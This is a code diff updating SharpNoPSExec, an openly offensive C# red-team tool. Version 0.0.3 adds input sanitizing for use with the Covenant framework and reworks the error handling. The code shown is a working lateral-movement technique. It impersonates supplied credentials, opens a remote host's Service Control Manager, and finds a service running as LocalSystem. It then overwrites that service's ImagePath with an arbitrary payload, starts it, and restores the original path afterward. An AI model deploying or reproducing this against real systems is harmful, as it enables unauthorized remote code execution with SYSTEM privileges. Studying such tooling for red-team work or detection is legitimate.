@@ -149,6 +149,11 @@ namespace SharpNoPSExec
             {
                 IntPtr serviceHandle = OpenService(SCMHandle, ServiceName, 0xF01FF);
 
+                if (serviceHandle == IntPtr.Zero)
+                {
+                    throw new Win32Exception(); 
+                }
+
                 uint bytesNeeded = 0;
                 QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
 
@@ -195,7 +200,7 @@ namespace SharpNoPSExec
             {
                 string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                 Console.WriteLine("\n[!] GetServiceInfo failed. Error: {0}", errorMessage);
-                Environment.Exit(0);
+                return serviceInfo;
             }
 
             return serviceInfo;
@@ -211,7 +216,7 @@ namespace SharpNoPSExec
 ███████║██║  ██║██║  ██║██║  ██║██║     ██║ ╚████║╚██████╔╝██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝
 
-Version: 0.0.2
+Version: 0.0.3
 Author: Julio Ureña (PlainText)
 Twitter: @juliourena
 ");
@@ -239,50 +244,67 @@ Note: If the selected service has a non-system account this will be ignored.
 ");
         }
 
+        // When working with Covenant I notice when targeting non interactive sessions it pass the quotes as part of the payload which make it fail.
+        // This code will remove quotes if exits. 
+        public static string SanitizeInput(string variable)
+        {
+            if (variable == null)
+                return "";
+
+            string lastChar = variable.Substring(variable.Length - 1);
+            string firstChar = variable.Substring(0, 1);
+            if (firstChar == lastChar)
+            {
+                if (lastChar == "'" || lastChar == '"'.ToString())
+                    variable = variable.Trim(lastChar.ToCharArray());
+            }
+            return variable;
+        }
+
         static void Main(string[] args)
         {
             // example from https://github.com/s0lst1c3/SharpFinder
             ProgramOptions options = new ProgramOptions();
 
-            foreach (string arg in args)
+            foreach (var arg in args)
             {
                 if (arg.StartsWith("--target="))
                 {
                     string[] components = arg.Split(new string[] { "--target=" }, StringSplitOptions.None);
-                    options.target = components[1];
+                    options.target = SanitizeInput(components[1]);
                 }
                 else if (arg.StartsWith("--payload="))
                 {
                     string[] components = arg.Split(new string[] { "--payload=" },StringSplitOptions.None);
 
-                    options.payload = components[1];
+                    options.payload = SanitizeInput(components[1]);
 
                 }
                 else if (arg.StartsWith("--username="))
                 {
                     string[] components = arg.Split(new string[] { "--username=" }, StringSplitOptions.None);
-                    options.username = components[1];
+                    options.username = SanitizeInput(components[1]);
                 }
                 else if (arg.StartsWith("--password="))
                 {
                     string[] components = arg.Split(new string[] { "--password=" }, StringSplitOptions.None);
-                    options.password = components[1];
+                    options.password = SanitizeInput(components[1]);
                 }
                 else if (arg.StartsWith("--domain="))
                 {
                     string[] components = arg.Split(new string[] { "--domain=" }, StringSplitOptions.None);
-                    options.domain = components[1];
+                    options.domain = SanitizeInput(components[1]);
                 }
                 else if (arg.StartsWith("--service="))
                 {
                     string[] components = arg.Split(new string[] { "--service=" }, StringSplitOptions.None);
-                    options.service = components[1];
+                    options.service = SanitizeInput(components[1]);
                 }
                 else if (arg.StartsWith("--help"))
                 {
                     PrintBanner();
                     PrintHelp();
-                    Environment.Exit(0);
+                    return;
                 }
                 else
                 {
@@ -291,26 +313,27 @@ Note: If the selected service has a non-system account this will be ignored.
                 }
             }
 
-            string username = null;
-            string password = null;
-            string domain = null;
+            if (options.target == "" || options.payload == "")
+            {
+                PrintBanner();
+                PrintHelp();
+                return;
+            }
+
 
             bool result = false;
 
             if (!String.IsNullOrEmpty(options.username) && !String.IsNullOrEmpty(options.password))
             {
                 IntPtr phToken = IntPtr.Zero;
-                username = options.username;
-                password = options.password;
-                domain = options.domain;
 
-                result = LogonUserA(username, domain, password, (int)LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, (int)LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, ref phToken);
+                result = LogonUserA(options.username, options.domain, options.password, (int)LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, (int)LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, ref phToken);
 
                 if (!result)
                 {
                     string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                     Console.WriteLine("[!] LogonUser failed. Error: {0}", errorMessage);
-                    Environment.Exit(0);
+                    return;
                 }
 
                 result = ImpersonateLoggedOnUser(phToken);
@@ -318,34 +341,26 @@ Note: If the selected service has a non-system account this will be ignored.
                 {
                     string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                     Console.WriteLine("[!] ImpersonateLoggedOnUser failed. Error:{0}", errorMessage);
-                    Environment.Exit(0);
+                    return;
                 }
             }
 
-            if (options.target == "" || options.payload == "")
-            {
-                PrintBanner();
-                PrintHelp();
-                Environment.Exit(0);
-            }
-
-            string target = options.target;
-
+            bool found = false;
             try
             {
-                Console.WriteLine($"\n[>] Open SC Manager from {target}.");
+                Console.WriteLine($"\n[>] Open SC Manager from {options.target}.");
                 IntPtr SCMHandle = OpenSCManager(options.target, null, SC_MANAGER_ALL_ACCESS);
 
                 if (SCMHandle == IntPtr.Zero)
                 {
                     string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                     Console.WriteLine("[!] OpenSCManager failed. Error: {0}", errorMessage);
-                    Environment.Exit(0);
+                    return;
                 }
 
                 // Open Connection to the remote machine and get all services 
-                Console.WriteLine($"\n[>] Getting services information from {target}.");
-                ServiceController[] services = ServiceController.GetServices(target);
+                Console.WriteLine($"\n[>] Getting services information from {options.target}.");
+                ServiceController[] services = ServiceController.GetServices(options.target);
 
                 ServiceInfo serviceInfo = new ServiceInfo();
 
@@ -356,6 +371,7 @@ Note: If the selected service has a non-system account this will be ignored.
                     Random r = new Random();
                     for (int i = 0; i < services.Length; i++)
                     {
+                        
                         int value = r.Next(0, services.Length);
 
                         // Check some values to select a service to use to trigger our paylaod 
@@ -366,15 +382,14 @@ Note: If the selected service has a non-system account this will be ignored.
                             if (serviceInfo.startName.ToLower() == "localsystem")
                             {
                                 Console.WriteLine($"    |-> Service {services[value].ServiceName} authenticated as {serviceInfo.startName}.");
+                                found = true;
                                 break;
                             }
                         }
                     }
                     
-                    serviceInfo = new ServiceInfo();
-
                     // If not service was found search for services with start mode manual, stopped without dependencies. 
-                    if (serviceInfo.displayName == null)
+                    if (!found)
                     {
                         for (int i = 0; i < services.Length; i++)
                         {
@@ -387,26 +402,26 @@ Note: If the selected service has a non-system account this will be ignored.
                                 if (serviceInfo.startName.ToLower() == "localsystem")
                                 {
                                     Console.WriteLine($"    |-> Service {services[value].ServiceName} authenticated as {serviceInfo.startName}.");
+                                    found = true;
                                     break;
                                 }
                             }
                         }
                     }
-                    if (serviceInfo.displayName == "")
+                    if (!found)
                     {
                         Console.WriteLine($"[!] No service found that met the default conditions, please select the service to run.");
-                        Environment.Exit(0);
+                        return;
                     }
                 }
                 else
                 {
                     Console.WriteLine($"\n[>] Checking if service {options.service} exists.");
 
-                    bool found = false;
                     // Check if --server=value exits. 
-                    foreach (var service in services)
+                    foreach (var svc in services)
                     {
-                        if (service.ServiceName == options.service)
+                        if (svc.ServiceName == options.service)
                             found = true;
                     }
 
@@ -420,37 +435,34 @@ Note: If the selected service has a non-system account this will be ignored.
                         else
                         {
                             Console.WriteLine($"\n[!] The service {options.service} is authenticated {serviceInfo.displayName} aborting to not lose the account.");
-                            Environment.Exit(0);
+                            return;
                         }
                     }
                     else
                     {
                         Console.WriteLine($"    |-> Service not found {options.service}.");
-                        Environment.Exit(0);
+                        return;
                     }
                 }
-
 
                 string previousImagePath = serviceInfo.binaryPathName;
 
                 Console.WriteLine($"\n[>] Setting up payload.");
 
-                string payload = options.payload;
-
-                Console.WriteLine($"    |-> payload = {payload}");
+                Console.WriteLine($"    |-> payload = {options.payload}");
 
                 Console.WriteLine($"    |-> ImagePath previous value = {previousImagePath}.");
 
                 // Modify the service with the payload
                 Console.WriteLine($"    |-> Modifying ImagePath value with payload.");
 
-                result = ChangeServiceConfig(serviceInfo.serviceHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, payload, null, IntPtr.Zero, null, null, null, null);
+                result = ChangeServiceConfig(serviceInfo.serviceHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, options.payload, null, IntPtr.Zero, null, null, null, null);
 
                 if (!result)
                 {
                     string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                     Console.WriteLine("[!] ChangeServiceConfig failed. Error: {0}", errorMessage);
-                    Environment.Exit(0);
+                    return;
                 }
 
                 Console.WriteLine($"\n[>] Starting service {serviceInfo.displayName} with new ImagePath.");
@@ -458,8 +470,7 @@ Note: If the selected service has a non-system account this will be ignored.
                 result = StartService(serviceInfo.serviceHandle, 0, null);
 
                 //if(!result)
-                    //Console.WriteLine($"    |-> Possible command execution completed.");
-
+                //Console.WriteLine($"    |-> Possible command execution completed.");
 
                 // Wait 5 seconds before restoring the values
                 Console.WriteLine($"\n[>] Waiting 5 seconds to finish.");
@@ -472,7 +483,7 @@ Note: If the selected service has a non-system account this will be ignored.
                 {
                     string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                     Console.WriteLine("[!] ChangeServiceConfig failed. Error: {0}", errorMessage);
-                    Environment.Exit(0);
+                    return;
                 }
                 else
                 {
